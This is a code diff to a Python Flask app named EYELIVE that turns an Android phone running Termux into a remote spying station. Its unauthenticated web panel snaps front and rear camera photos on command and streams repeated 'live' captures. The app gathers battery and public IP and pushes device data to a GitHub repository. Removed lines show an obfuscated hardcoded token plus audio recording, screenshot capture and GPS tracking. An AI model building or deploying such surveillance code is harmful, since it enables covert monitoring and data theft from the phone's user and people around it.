@@ -1,37 +1,30 @@
-from flask import Flask, render_template_string, jsonify, request
+from flask import Flask, render_template_string, jsonify, request, send_file
 import os, json, threading, time, subprocess, requests as req, base64 as b64
 from datetime import datetime
 
-def _tk():
-    t = "now_7fobDPqMyVGXyhzQkT5SLhvaUkpKNr1gh7KC"
-    r = ""
-    for c in t:
-        if c.isalpha():
-            b = ord('a') if c.islower() else ord('A')
-            r += chr((ord(c) - b - 7) % 26 + b)
-        else:
-            r += c
-    return r
-
 app = Flask(__name__)
 
+# Token via variavel de ambiente (definida no install.sh)
+TOKEN = os.environ.get("EYELIVE_TOKEN", "")
 DEVICE_NAME = os.environ.get("DEVICE_NAME", "Celular")
 DEVICE_ID = os.environ.get("DEVICE_ID", "celular_1")
-TOKEN = _tk()
 REPO = "gynbetfc/eyelive"
+FOTOS_DIR = "/data/data/com.termux/files/home/eyelive_fotos"
+os.makedirs(FOTOS_DIR, exist_ok=True)
 
 dados = {
     "nome": DEVICE_NAME, "id": DEVICE_ID,
     "bateria": "?%", "carregando": False,
     "gps": {"lat": 0, "lng": 0}, "ip": "",
-    "ultimo_update": "", "status": "online"
+    "fotos": [], "ultimo_update": "", "status": "online"
 }
 
 def shell(cmd):
-    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=8).strip()
+    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
     except: return "?"
 
 def salvar():
+    if not TOKEN: return
     try:
         fn = f"dados/{DEVICE_ID}.json"
         url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
@@ -53,6 +46,7 @@ def coletar():
                 dados["carregando"] = bat.get("plugged","") != ""
             dados["ip"] = shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
             dados["ultimo_update"] = datetime.now().strftime("%H:%M:%S")
+            dados["fotos"] = sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith('.jpg')])[-10:]
             salvar()
         except: pass
         time.sleep(30)
@@ -79,52 +73,46 @@ HTML = r"""<!DOCTYPE html>
         .camera-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px}
         .cam-card{background:var(--card);border:1px solid#222;border-radius:15px;overflow:hidden}
         .cam-card h3{padding:10px 15px;color:var(--gold);font-size:.9em;border-bottom:1px solid#222}
-        .cam-view{width:100%;height:180px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:3em}
-        .cam-btns{padding:10px;display:flex;gap:8px}
+        .cam-view{width:100%;height:200px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:3em;position:relative;overflow:hidden}
+        .cam-view img{width:100%;height:100%;object-fit:cover}
+        .cam-btns{padding:10px;display:flex;gap:8px;flex-wrap:wrap}
         .card{background:var(--card);border:1px solid#222;border-radius:15px;padding:15px;margin-bottom:15px}
         .card h3{color:var(--gold);font-size:.9em;margin-bottom:10px}
-        .map-view{width:100%;height:250px;background:#111;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#333;font-size:2em}
         .btn{padding:10px 18px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:.8em}
         .btn-gold{background:var(--gold);color:#000}.btn-green{background:var(--green);color:#000}.btn-red{background:var(--red);color:#fff}
         .tab-content{display:none}.tab-content.active{display:block}
         .info-row{display:flex;justify-content:space-between;padding:5px 0;color:#aaa;font-size:.85em}
         .info-row span:last-child{color:#fff}
+        .galeria{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:10px}
+        .galeria img{width:100%;height:100px;object-fit:cover;border-radius:8px;cursor:pointer}
+        .live-badge{position:absolute;top:8px;right:8px;background:var(--red);color:#fff;padding:4px 8px;border-radius:10px;font-size:.7em;animation:pulse 1s infinite}
     </style>
 </head>
 <body>
-<div class="header"><div><h1>EYELIVE</h1><span style="color:var(--green);font-size:.75em"><span class="pulse"></span> {DEVICE}</span></div></div>
+<div class="header"><div><h1>EYELIVE</h1><span style="color:var(--green);font-size:.75em"><span class="pulse"></span> {{DEVICE}}</span></div></div>
 <div class="nav">
     <a href="#" class="active" onclick="tab('cameras',this)">📷 Cameras</a>
-    <a href="#" onclick="tab('gps',this)">📍 GPS</a>
+    <a href="#" onclick="tab('galeria',this)">🖼️ Galeria</a>
     <a href="#" onclick="tab('info',this)">📊 Info</a>
 </div>
 <div class="container">
     <div id="tab-cameras" class="tab-content active">
         <div class="camera-grid">
-            <div class="cam-card"><h3>📷 Frontal</h3><div class="cam-view">📷</div><div class="cam-btns"><button class="btn btn-gold" onclick="cmd('foto_frontal')">📸 Foto</button></div></div>
-            <div class="cam-card"><h3>📷 Traseira</h3><div class="cam-view">📷</div><div class="cam-btns"><button class="btn btn-gold" onclick="cmd('foto_traseira')">📸 Foto</button></div></div>
-        </div>
-        <div class="card"><h3>🎤 Audio</h3><button class="btn btn-red" onclick="cmd('audio')">🔴 Gravar 30s</button></div>
-        <div class="card"><h3>📱 Tela</h3><button class="btn btn-gold" onclick="cmd('screenshot')">📸 Screenshot</button></div>
-    </div>
-    <div id="tab-gps" class="tab-content">
-        <div class="card"><h3>📍 Localizacao</h3><div class="map-view">🗺️</div><div style="margin-top:10px"><div class="info-row"><span>Lat:</span><span id="gps-lat">--</span></div><div class="info-row"><span>Lng:</span><span id="gps-lng">--</span></div></div><button class="btn btn-gold" onclick="cmd('gps')" style="width:100%;margin-top:10px">🔄 Atualizar GPS</button></div>
-    </div>
-    <div id="tab-info" class="tab-content">
-        <div class="card"><h3>📊 Dispositivo</h3>
-            <div class="info-row"><span>Nome:</span><span id="info-nome">--</span></div>
-            <div class="info-row"><span>Bateria:</span><span id="info-bat">--</span></div>
-            <div class="info-row"><span>IP:</span><span id="info-ip">--</span></div>
-            <div class="info-row"><span>GPS:</span><span id="info-gps">--</span></div>
-            <div class="info-row"><span>Update:</span><span id="info-up">--</span></div>
+            <div class="cam-card"><h3>📷 Frontal</h3><div class="cam-view" id="frontal-view"><span>📷</span></div><div class="cam-btns"><button class="btn btn-gold" onclick="foto('frontal')">📸 Foto</button><button class="btn btn-green" onclick="live('frontal')">▶️ Live</button></div></div>
+            <div class="cam-card"><h3>📷 Traseira</h3><div class="cam-view" id="traseira-view"><span>📷</span></div><div class="cam-btns"><button class="btn btn-gold" onclick="foto('traseira')">📸 Foto</button><button class="btn btn-green" onclick="live('traseira')">▶️ Live</button></div></div>
         </div>
     </div>
+    <div id="tab-galeria" class="tab-content"><div class="card"><h3>🖼️ Ultimas Fotos</h3><div class="galeria" id="galeria"></div></div></div>
+    <div id="tab-info" class="tab-content"><div class="card"><h3>📊 Dispositivo</h3><div class="info-row"><span>Nome:</span><span id="info-nome">--</span></div><div class="info-row"><span>Bateria:</span><span id="info-bat">--</span></div><div class="info-row"><span>IP:</span><span id="info-ip">--</span></div><div class="info-row"><span>Fotos:</span><span id="info-fotos">0</span></div></div></div>
 </div>
 <script>
+var liveTimers={};
 function tab(t,el){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));document.getElementById('tab-'+t).classList.add('active');el.classList.add('active')}
-function cmd(c){fetch('/cmd/'+c).then(r=>r.json()).then(d=>alert(d.msg||'OK'))}
-function update(){fetch('/api/status').then(r=>r.json()).then(d=>{document.getElementById('gps-lat').textContent=d.gps.lat;document.getElementById('gps-lng').textContent=d.gps.lng;document.getElementById('info-bat').textContent=d.bateria+(d.carregando?' [CARREGANDO]':'');document.getElementById('info-ip').textContent=d.ip;document.getElementById('info-gps').textContent=d.gps.lat+','+d.gps.lng;document.getElementById('info-up').textContent=d.ultimo_update;document.getElementById('info-nome').textContent=d.nome})}
-setInterval(update,5000);update()
+function foto(cam){fetch('/cmd/foto_'+cam).then(r=>r.json()).then(d=>{alert(d.msg);atualizarFotos()})}
+function live(cam){document.getElementById(cam+'-view').innerHTML='<img src="/live/'+cam+'?t='+Date.now()+'" id="live-'+cam+'"><div class="live-badge" style="display:block">LIVE</div>';liveTimers[cam]=setInterval(function(){var img=document.getElementById('live-'+cam);if(img)img.src='/live/'+cam+'?t='+Date.now()},3000)}
+function atualizarFotos(){fetch('/api/status').then(r=>r.json()).then(d=>{var h='';(d.fotos||[]).forEach(function(f){h+='<img src="/foto/'+f+'" onclick="window.open(this.src)">'});document.getElementById('galeria').innerHTML=h||'<p style="color:#888">Nenhuma foto</p>';document.getElementById('info-fotos').textContent=(d.fotos||[]).length})}
+function update(){fetch('/api/status').then(r=>r.json()).then(d=>{document.getElementById('info-bat').textContent=d.bateria+(d.carregando?' [CARREGANDO]':'');document.getElementById('info-ip').textContent=d.ip;document.getElementById('info-nome').textContent=d.nome})}
+setInterval(update,5000);setInterval(atualizarFotos,10000);update();atualizarFotos()
 </script>
 </body>
 </html>"""
@@ -139,22 +127,36 @@ def api_status():
 
 @app.route('/cmd/<comando>')
 def comando(comando):
-    if comando == 'gps':
-        return jsonify({"msg":"GPS: "+str(dados["gps"])})
-    elif comando == 'audio':
-        threading.Thread(target=lambda: shell("termux-microphone-record -f /tmp/audio.aac -l 30 -q 2>/dev/null"), daemon=True).start()
-        return jsonify({"msg":"Gravando 30s..."})
-    elif comando == 'foto_frontal':
-        threading.Thread(target=lambda: shell("termux-camera-photo -c 0 /tmp/foto_frontal.jpg 2>/dev/null"), daemon=True).start()
-        return jsonify({"msg":"Foto frontal salva!"})
+    if comando == 'foto_frontal':
+        t = datetime.now().strftime("%H%M%S")
+        nome = f"frontal_{t}.jpg"
+        path = f"{FOTOS_DIR}/{nome}"
+        threading.Thread(target=lambda: shell(f"termux-camera-photo -c 0 {path} 2>/dev/null"), daemon=True).start()
+        return jsonify({"msg":"Foto frontal capturada!","foto":nome})
     elif comando == 'foto_traseira':
-        threading.Thread(target=lambda: shell("termux-camera-photo -c 1 /tmp/foto_traseira.jpg 2>/dev/null"), daemon=True).start()
-        return jsonify({"msg":"Foto traseira salva!"})
-    elif comando == 'screenshot':
-        threading.Thread(target=lambda: shell("screencap /tmp/screenshot.png 2>/dev/null"), daemon=True).start()
-        return jsonify({"msg":"Screenshot salvo!"})
+        t = datetime.now().strftime("%H%M%S")
+        nome = f"traseira_{t}.jpg"
+        path = f"{FOTOS_DIR}/{nome}"
+        threading.Thread(target=lambda: shell(f"termux-camera-photo -c 1 {path} 2>/dev/null"), daemon=True).start()
+        return jsonify({"msg":"Foto traseira capturada!","foto":nome})
     return jsonify({"msg":"OK"})
+
+@app.route('/live/<cam>')
+def live(cam):
+    c = "0" if cam == "frontal" else "1"
+    path = f"/tmp/eyelive_live_{cam}.jpg"
+    shell(f"termux-camera-photo -c {c} {path} 2>/dev/null")
+    if os.path.exists(path):
+        return send_file(path, mimetype='image/jpeg')
+    return "", 404
+
+@app.route('/foto/<nome>')
+def foto(nome):
+    path = f"{FOTOS_DIR}/{nome}"
+    if os.path.exists(path):
+        return send_file(path, mimetype='image/jpeg')
+    return "", 404
 
 if __name__ == '__main__':
     print(f"EYELIVE - {DEVICE_NAME}")
-    app.run(host='0.0.0.0', port=5050, debug=False)
+    app.run(host='0.0.0.0', port=5050, debug=False, threaded=True)
